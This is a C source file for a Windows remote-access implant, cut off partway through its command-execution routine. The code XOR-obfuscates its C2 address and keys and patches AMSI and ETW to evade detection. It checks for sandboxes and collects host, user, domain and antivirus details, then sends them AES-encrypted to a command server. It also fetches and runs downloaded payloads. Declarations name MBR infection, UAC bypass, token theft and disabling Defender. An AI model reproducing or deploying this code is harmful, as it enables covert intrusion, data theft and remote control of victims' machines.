#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <wbemidl.h>
#include <comdef.h>
#include <strsafe.h>
#include <ntsecapi.h>
#include <wincrypt.h>
#include <winternl.h>
#include <psapi.h>
#include <ntstatus.h>
#include <bcrypt.h>
#include <winioctl.h>
#include <intrin.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <shellapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

// ==================== XOR OBFUSCATION ====================
#define XOR_KEY 0xDD

VOID ObfuscateStr(PCHAR buf, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

// Obfuscated C2 server - https://your-c2-server.com/beacon (XORed)
CHAR g_c2_server_obf[] = "\x78\x9D\x9D\x9A\x9B\x9C\xA9\xE1\x9B\xA9\x9B\x9A\xA9\x96\x9A\x9B\x9C\xA9\xB6\x9B\x98\x9C\xA9\xA9\xE9\xA9\x98\x9A\x9C\x9B\x98\xA9\x98\x99\x9A\x9B\x9C";
CHAR g_aes_key_obf[] = "\xAB\xAA\xA8\xA3\xA7\xB6\xA8\xF5\xA8\xB3\xB4\xA8\xAB\xAA\xA8\xA3\xA7\xB6\xA8\xF5\xA8\xB3\xB4\xA8\xAA\xA5\xB1\xA7\xA5\xAD\xB4\x23";
CHAR g_aes_iv_obf[] = "\xB1\xB8\xB7\xAF\xB2\xB9\xA5\xA7\xA8\xB9\xA7\xA6\xF5\xF4\xF4\x23";
CHAR g_mutex_name_obf[] = "\x9A\x9D\x9A\x9D\x9A\x8F\x9A\x9D\x9A\x9D\x9A\x8F\x9A\x9D\x9A\x9D\x23";

CHAR g_c2_server[256] = {0};
CHAR g_aes_key[64] = {0};
CHAR g_aes_iv[32] = {0};
CHAR g_mutex_name[64] = {0};

VOID InitObfuscatedStrings() {
    CHAR tmp[256];
    memcpy(tmp, g_c2_server_obf, sizeof(g_c2_server_obf));
    ObfuscateStr(tmp, sizeof(g_c2_server_obf) - 1);
    strncpy(g_c2_server, tmp, 255);
    memcpy(tmp, g_aes_key_obf, sizeof(g_aes_key_obf));
    ObfuscateStr(tmp, sizeof(g_aes_key_obf) - 1);
    strncpy(g_aes_key, tmp, 63);
    memcpy(tmp, g_aes_iv_obf, sizeof(g_aes_iv_obf));
    ObfuscateStr(tmp, sizeof(g_aes_iv_obf) - 1);
    strncpy(g_aes_iv, tmp, 31);
    memcpy(tmp, g_mutex_name_obf, sizeof(g_mutex_name_obf));
    ObfuscateStr(tmp, sizeof(g_mutex_name_obf) - 1);
    strncpy(g_mutex_name, tmp, 63);
}

// ==================== CONSTANTS ====================
#define C2_BASE_INTERVAL_SECONDS 60
#define C2_JITTER_MAX_SECONDS 120
#define GDRV_DEVICE_NAME L"\\\\.\\GIO"
#define GDRV_IOCTL_READ_MSR 0x9C402470
#define GDRV_IOCTL_WRITE_MSR 0x9C402474
#define GDRV_IOCTL_READ_PHYSICAL 0x9C402478
#define GDRV_IOCTL_WRITE_PHYSICAL 0x9C40247C
#define IA32_EFER 0xC0000080
#define CI_OPTIONS_DISABLE_DSE 0x6
#define ETW_EVENT_WRITE_HASH 0x1B7E0F38
#define AMSI_SCAN_BUFFER_HASH 0x1B7E0F37

// ==================== STRUCTURES ====================
typedef struct _BEACON_DATA {
    WCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    WCHAR UserName[256];
    DWORD ProcessId;
    WCHAR OSVersion[128];
    BOOL IsAdmin;
    WCHAR ExePath[MAX_PATH];
    DWORD DefenderStatus;
    DWORD Uptime;
    DWORD InstallDate;
    DWORD LastBootTime;
    WCHAR AntivirusProduct[256];
    WCHAR DomainName[256];
} BEACON_DATA, *PBEACON_DATA;

typedef struct _C2_TASK {
    DWORD TaskId;
    WCHAR Command[1024];
    WCHAR Arguments[2048];
    BOOL IsPowerShell;
    BOOL WaitForOutput;
    BOOL IsDownload;
    WCHAR DownloadURL[1024];
    WCHAR DownloadPath[MAX_PATH];
} C2_TASK, *PC2_TASK;

typedef struct _PS_PROTECTION {
    UCHAR Level;
} PS_PROTECTION, *PPS_PROTECTION;

typedef struct _C2_ENDPOINT {
    WCHAR host[128];
    WCHAR path[128];
    INTERNET_PORT port;
} C2_ENDPOINT;

typedef struct _KERNEL_MODULE_INFO {
    ULONGLONG Base;
    ULONGLONG Size;
    CHAR Name[256];
} KERNEL_MODULE_INFO, *PKERNEL_MODULE_INFO;

typedef enum _PROCESSINFOCLASS {
    ProcessProtectionInformation = 0x3D,
    ProcessHandleInformation = 0x51
} PROCESSINFOCLASS;

typedef struct _SYSTEM_HANDLE_ENTRY {
    ULONG OwnerPid;
    BYTE ObjectType;
    BYTE HandleFlags;
    USHORT HandleValue;
    PVOID ObjectPointer;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY, *PSYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG Count;
    SYSTEM_HANDLE_ENTRY Handle[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(DWORD, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE);
typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE);
typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);

// ==================== GLOBALS ====================
C2_ENDPOINT g_C2Fallbacks[5] = {0};
int g_C2Count = 0;
int g_C2Current = 0;
HANDLE g_hMutex = NULL;
pNtQuerySystemInformation NtQuerySystemInformation = NULL;
pNtDuplicateObject NtDuplicateObject = NULL;
pNtSuspendProcess NtSuspendProcess = NULL;
pNtResumeProcess NtResumeProcess = NULL;
pNtReadVirtualMemory NtReadVirtualMemory = NULL;
pNtWriteVirtualMemory NtWriteVirtualMemory = NULL;

// ==================== FORWARD DECLARATIONS ====================
ULONGLONG FindPattern(BYTE* base, DWORD size, BYTE* pattern, DWORD patternLen);
ULONGLONG WalkPageTable(PVOID virtualAddr);
BOOL AesEncrypt(BYTE* plaintext, DWORD plaintextLen, BYTE** ciphertext, DWORD* ciphertextLen);
BOOL AesDecrypt(BYTE* ciphertext, DWORD ciphertextLen, BYTE** plaintext, DWORD* plaintextLen);
BOOL SendBeaconToC2(PBEACON_DATA beacon, PC2_TASK task);
DWORD WINAPI BeaconThread(LPVOID lpParam);
BOOL PatchAmsi(void);
BOOL PatchEtw(void);
BOOL IsSandboxed(void);
BOOL EnableDebugPrivilege(void);
BOOL KillProcessByName(LPCWSTR processName);
BOOL HideFile(LPCWSTR filePath);
BOOL ClearEventLogs(void);
BOOL AddToStartup(LPCWSTR appPath);
BOOL ExecuteWMIQuery(LPCWSTR query, BSTR* result);
BOOL BypassUAC(void);
BOOL InstallServicePersistence(void);
BOOL InfectMbr(BYTE* payload, DWORD payloadSize);
BOOL CreateRegistryKey(LPCWSTR keyPath, LPCWSTR valueName, DWORD valueData);
BOOL DeleteRegistryKey(LPCWSTR keyPath);
BOOL DisableFirewall(void);
BOOL AddExclusionToDefender(LPCWSTR path);
BOOL EnumSecurityProducts(WCHAR* output, DWORD outputSize);
BOOL SelfDelete(void);
BOOL ProcessHollowing(LPCWSTR targetProcess, LPCWSTR payloadPath);
BOOL TokenStealing(void);
BOOL RunPE(BYTE* peData, DWORD peSize);
BOOL DownloadFile(LPCWSTR url, LPCWSTR outputPath);
BOOL ExecuteCommand(PC2_TASK task, WCHAR* output, DWORD outputSize);

// ==================== NT FUNCTION INITIALIZATION ====================
VOID InitNtFunctions() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
        NtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
        NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(hNtdll, "NtSuspendProcess");
        NtResumeProcess = (pNtResumeProcess)GetProcAddress(hNtdll, "NtResumeProcess");
        NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
        NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    }
}

// ==================== SINGLE INSTANCE ====================
BOOL EnsureSingleInstance() {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, (LPCWSTR)g_mutex_name);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return FALSE;
    }
    g_hMutex = hMutex;
    return TRUE;
}

// ==================== DEBUG PRIVILEGE ====================
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result;
}

// ==================== UTILITY ====================
void ElevateSelf() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elev, size, &size))
            isElevated = elev.TokenIsElevated;
        CloseHandle(hToken);
    }
    if (!isElevated) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = exePath;
        sei.nShow = SW_HIDE;
        if (ShellExecuteExW(&sei)) ExitProcess(0);
        else ExitProcess(1);
    }
}

// ==================== AMSI BYPASS ====================
BOOL PatchAmsi() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) return FALSE;
    FARPROC pAmsiScanBuf = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuf) return FALSE;
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuf, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    memcpy(pAmsiScanBuf, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuf, sizeof(patch), oldProtect, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), pAmsiScanBuf, sizeof(patch));
    return TRUE;
}

// ==================== ETW BYPASS ====================
BOOL PatchEtw() {
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtDll) return FALSE;
    FARPROC pEtwEventWrite = GetProcAddress(hNtDll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), pEtwEventWrite, sizeof(patch));
    return TRUE;
}

// ==================== SANDBOX DETECTION ====================
BOOL IsSandboxed() {
    ULARGE_INTEGER freeBytes, totalBytes;
    if (GetDiskFreeSpaceExW(L"C:\\", &freeBytes, &totalBytes, NULL)) {
        if (totalBytes.QuadPart < 64424509440ULL) return TRUE;
    }
    MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
    if (GlobalMemoryStatusEx(&memStatus)) {
        if (memStatus.ullTotalPhys < 4294967296ULL) return TRUE;
    }
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(computerName, &size)) {
        LPCWSTR names[] = { L"SANDBOX", L"VIRUS", L"MALWARE", L"TEST", L"WIN-", L"7SILVER", L"CODER", L"DEBUG", L"ANALYSIS" };
        for (int i = 0; i < 9; i++) {
            if (wcsstr(computerName, names[i])) return TRUE;
        }
    }
    if (GetTickCount64() < 600000) return TRUE;
    SYSTEM_POWER_STATUS power;
    GetSystemPowerStatus(&power);
    if (power.BatteryFlag != 128) return TRUE;
    if (IsDebuggerPresent()) return TRUE;
    return FALSE;
}

// ==================== C2 FALLBACK PARSING ====================
VOID ParseC2Server() {
    CHAR* hostStart = strstr(g_c2_server, "://");
    if (!hostStart) return;
    hostStart += 3;
    size_t len = strlen(hostStart);
    for (size_t i = 0; i < len && i < 127; i++) {
        g_C2Fallbacks[0].host[i] = (WCHAR)hostStart[i];
    }
    g_C2Fallbacks[0].port = INTERNET_DEFAULT_HTTPS_PORT;
    wcscpy(g_C2Fallbacks[0].path, L"/beacon");
    g_C2Count = 1;
    wcscpy(g_C2Fallbacks[1].host, L"cloudflare-dns.com");
    g_C2Fallbacks[1].port = 443;
    wcscpy(g_C2Fallbacks[1].path, L"/dns-query");
    wcscpy(g_C2Fallbacks[2].host, L"dns.google");
    g_C2Fallbacks[2].port = 443;
    wcscpy(g_C2Fallbacks[2].path, L"/resolve");
    g_C2Count = 3;
}

// ==================== CRYPTOGRAPHY ====================
BOOL AesEncrypt(BYTE* plaintext, DWORD plaintextLen, BYTE** ciphertext, DWORD* ciphertextLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)g_aes_key, strlen(g_aes_key), 0);
    DWORD paddedLen = ((plaintextLen + 15) / 16) * 16;
    *ciphertextLen = paddedLen + 16;
    *ciphertext = (BYTE*)malloc(*ciphertextLen);
    if (!*ciphertext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }
    NTSTATUS status = BCryptEncrypt(hKey, plaintext, plaintextLen, NULL, (PUCHAR)g_aes_iv, strlen(g_aes_iv), *ciphertext, *ciphertextLen, ciphertextLen, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return BCRYPT_SUCCESS(status);
}

BOOL AesDecrypt(BYTE* ciphertext, DWORD ciphertextLen, BYTE** plaintext, DWORD* plaintextLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)g_aes_key, strlen(g_aes_key), 0);
    *plaintextLen = ciphertextLen;
    *plaintext = (BYTE*)malloc(*plaintextLen + 1);
    if (!*plaintext) return FALSE;
    NTSTATUS status = BCryptDecrypt(hKey, ciphertext, ciphertextLen, NULL, (PUCHAR)g_aes_iv, strlen(g_aes_iv), *plaintext, *plaintextLen, plaintextLen, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (BCRYPT_SUCCESS(status)) (*plaintext)[*plaintextLen] = 0;
    return BCRYPT_SUCCESS(status);
}

// ==================== BEACON DATA ====================
void GatherBeaconData(PBEACON_DATA beacon) {
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(beacon->ComputerName, &size);
    DWORD userSize = 256;
    GetUserNameW(beacon->UserName, &userSize);
    beacon->ProcessId = GetCurrentProcessId();
    beacon->IsAdmin = IsUserAnAdmin();
    GetModuleFileNameW(NULL, beacon->ExePath, MAX_PATH);
    beacon->Uptime = GetTickCount64() / 1000;
    
    RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
    RtlGetVersion(&osvi);
    swprintf(beacon->OSVersion, 128, L"%d.%d.%d Build %d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwBuildNumber);
    
    HKEY hKey;
    beacon->DefenderStatus = 2;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0, valueSize = sizeof(value);
        RegQueryValueExW(hKey, L"DisableRealtimeMonitoring", NULL, NULL, (LPBYTE)&value, &valueSize);
        beacon->DefenderStatus = value;
        RegCloseKey(hKey);
    }
    
    // Get Windows install date
    HKEY hKeySetup;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKeySetup) == ERROR_SUCCESS) {
        DWORD installDate = 0;
        DWORD dataSize = sizeof(installDate);
        RegQueryValueExW(hKeySetup, L"InstallDate", NULL, NULL, (LPBYTE)&installDate, &dataSize);
        beacon->InstallDate = installDate;
        RegCloseKey(hKeySetup);
    }
    
    // Get domain name
    DWORD domainSize = 256;
    GetComputerNameExW(ComputerNameDnsDomain, beacon->DomainName, &domainSize);
    if (wcslen(beacon->DomainName) == 0) wcscpy(beacon->DomainName, L"WORKGROUP");
    
    // Get antivirus products
    EnumSecurityProducts(beacon->AntivirusProduct, 256);
}

BOOL EnumSecurityProducts(WCHAR* output, DWORD outputSize) {
    output[0] = 0;
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return FALSE;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (SUCCEEDED(hr)) {
        hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\SecurityCenter2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (SUCCEEDED(hr)) {
            hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
            IEnumWbemClassObject* pEnumerator = NULL;
            hr = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
            if (SUCCEEDED(hr) && pEnumerator) {
                IWbemClassObject* pclsObj = NULL;
                ULONG uReturn = 0;
                while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK) {
                    VARIANT vtProp;
                    if (SUCCEEDED(pclsObj->Get(L"displayName", 0, &vtProp, 0, 0))) {
                        wcsncat(output, vtProp.bstrVal, outputSize - wcslen(output) - 1);
                        wcsncat(output, L"; ", outputSize - wcslen(output) - 1);
                        VariantClear(&vtProp);
                    }
                    pclsObj->Release();
                }
                pEnumerator->Release();
            }
            pSvc->Release();
        }
        pLoc->Release();
    }
    CoUninitialize();
    return wcslen(output) > 0;
}

// ==================== USER AGENT POOL ====================
LPCWSTR UAPool[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    L"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"
};

// ==================== C2 COMMUNICATION ====================
BOOL SendBeaconToC2(PBEACON_DATA beacon, PC2_TASK task) {
    char json[8192];
    snprintf(json, sizeof(json), 
            "{\"computer\":\"%ls\",\"user\":\"%ls\",\"pid\":%d,\"os\":\"%ls\","
            "\"admin\":%s,\"path\":\"%ls\",\"defender\":%d,\"uptime\":%d,"
            "\"install_date\":%d,\"domain\":\"%ls\",\"av\":\"%ls\"}",
            beacon->ComputerName, beacon->UserName, beacon->ProcessId,
            beacon->OSVersion, beacon->IsAdmin ? "true" : "false",
            beacon->ExePath, beacon->DefenderStatus, beacon->Uptime,
            beacon->InstallDate, beacon->DomainName, beacon->AntivirusProduct);
    
    BYTE* encrypted = NULL;
    DWORD encryptedLen = 0;
    if (!AesEncrypt((BYTE*)json, strlen(json), &encrypted, &encryptedLen)) return FALSE;
    
    DWORD base64Len = 0;
    CryptBinaryToStringA(encrypted, encryptedLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
    char* b64 = (char*)malloc(base64Len + 1);
    if (!b64) { free(encrypted); return FALSE; }
    CryptBinaryToStringA(encrypted, encryptedLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64, &base64Len);
    
    int uaIndex = rand() % (sizeof(UAPool) / sizeof(UAPool[0]));
    BOOL result = FALSE;
    
    for (int c2try = 0; c2try < max(1, g_C2Count); c2try++) {
        int idx = (g_C2Current + c2try) % max(1, g_C2Count);
        HINTERNET hSession = WinHttpOpen(UAPool[uaIndex], WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) continue;
        
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
        
        HINTERNET hConnect = WinHttpConnect(hSession, g_C2Fallbacks[idx].host, g_C2Fallbacks[idx].port, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); continue; }
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_C2Fallbacks[idx].path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); continue; }
        
        char postData[8192];
        snprintf(postData, sizeof(postData), "d=%s", b64);
        
        if (WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded", 0, (LPVOID)postData, strlen(postData), strlen(postData), 0)) {
            if (WinHttpReceiveResponse(hRequest, NULL)) {
                char response[16384] = {0};
                DWORD bytesRead = 0;
                WinHttpReadData(hRequest, response, sizeof(response) - 1, &bytesRead);
                char* body = strstr(response, "\r\n\r\n");
                if (body) body += 4; else body = response;
                if (strlen(body) > 0) {
                    BYTE* decrypted = NULL;
                    DWORD decryptedLen = 0;
                    if (AesDecrypt((BYTE*)body, (DWORD)strlen(body), &decrypted, &decryptedLen)) {
                        char* taskIdStr = strstr((char*)decrypted, "\"task_id\"");
                        if (taskIdStr) {
                            char* valStart = strchr(taskIdStr, ':');
                            if (valStart) {
                                valStart++; while (*valStart == ' ' || *valStart == '\"') valStart++;
                                int taskId = atoi(valStart);
                                if (taskId != 0) {
                                    char* cmdStr = strstr((char*)decrypted, "\"command\"");
                                    if (cmdStr) {
                                        valStart = strchr(cmdStr, ':');
                                        if (valStart) {
                                            valStart++; while (*valStart == ' ' || *valStart == '\"') valStart++;
                                            char* end = strchr(valStart, '\"');
                                            if (end) *end = 0;
                                            MultiByteToWideChar(CP_UTF8, 0, valStart, -1, task->Command, 1024);
                                            task->TaskId = taskId;
                                            task->WaitForOutput = TRUE;
                                        }
                                    }
                                    char* downloadStr = strstr((char*)decrypted, "\"download\"");
                                    if (downloadStr) {
                                        task->IsDownload = TRUE;
                                        char* urlStart = strchr(downloadStr, ':');
                                        if (urlStart) {
                                            urlStart++; while (*urlStart == ' ' || *urlStart == '\"') urlStart++;
                                            char* urlEnd = strchr(urlStart, '\"');
                                            if (urlEnd) *urlEnd = 0;
                                            MultiByteToWideChar(CP_UTF8, 0, urlStart, -1, task->DownloadURL, 1024);
                                            wcscpy(task->DownloadPath, L"C:\\Windows\\Temp\\payload.exe");
                                        }
                                    }
                                }
                            }
                        }
                        free(decrypted);
                    }
                }
                result = TRUE;
            }
        }
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        if (result) { g_C2Current = (idx + 1) % max(1, g_C2Count); break; }
    }
    free(encrypted);
    free(b64);
    return result;
}

// ==================== DOWNLOAD AND EXECUTE ====================
BOOL DownloadFile(LPCWSTR url, LPCWSTR outputPath) {
    HINTERNET hSession = WinHttpOpen(L"Church/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;
    HINTERNET hConnect = WinHttpConnect(hSession, url, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return FALSE;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return FALSE;
    }
    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return FALSE;
    }
    DWORD bytesRead = 0;
    BYTE buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}

// ==================== COMMAND EXECUTION ====================
BOOL ExecuteCommand(PC2_TASK task, WCHAR* output, DWORD outputSize) {
    if (task->IsDownload && task->DownloadURL[0] != 0) {
        if (DownloadFile(task->DownloadURL, task->DownloadPath)) {
            PROCESS_INFORMATION pi;
            STARTUPINFOW si = { sizeof(si) };
            CreateProcessW(task->DownloadPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            if (pi.hProcess) CloseHandle(pi.hProcess);
            if (pi.hThread) CloseHandle(pi.hThread);
            wcscpy(output, L"Download and execution completed");
            return TRUE;
        }
        wcscpy(output, L"Download failed");
        return FALSE;
    }
    
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdOutRead, hStdOutWrite;
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) return FALSE;
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
